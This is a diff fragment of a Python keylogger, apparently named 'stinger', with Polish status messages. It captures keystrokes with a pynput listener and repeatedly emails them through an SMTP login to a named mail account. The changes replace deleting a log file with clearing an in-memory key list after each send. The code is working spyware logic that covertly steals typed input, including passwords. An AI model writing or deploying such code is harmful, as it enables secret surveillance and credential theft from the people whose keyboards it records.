@@ -33,7 +33,6 @@ def send():
 	 server.login("pytania@greenstar.net.pl",password)
 	 server.sendmail(sender,reciver,message)
 
-
 c=0
 while c<=5:
 	with Listener(on_press=on_press) as listener:
@@ -54,13 +53,13 @@ while c<=5:
 		{}
 
 		""".format(subject,mess)
+		f.close()
 		a=7
 		t=Timer(1,send)
 		t.start()
 		sleep(1)
 		t.cancel()	
 		print("wysłano")
-		os.remove('/home/weirdo/Desktop/stinger/log.txt')
-		sleep(1)
-		open ('/home/weirdo/Desktop/stinger/log.txt','w')
-		sleep(1)
+		keys.clear()
+		print("lista czysta")
+		
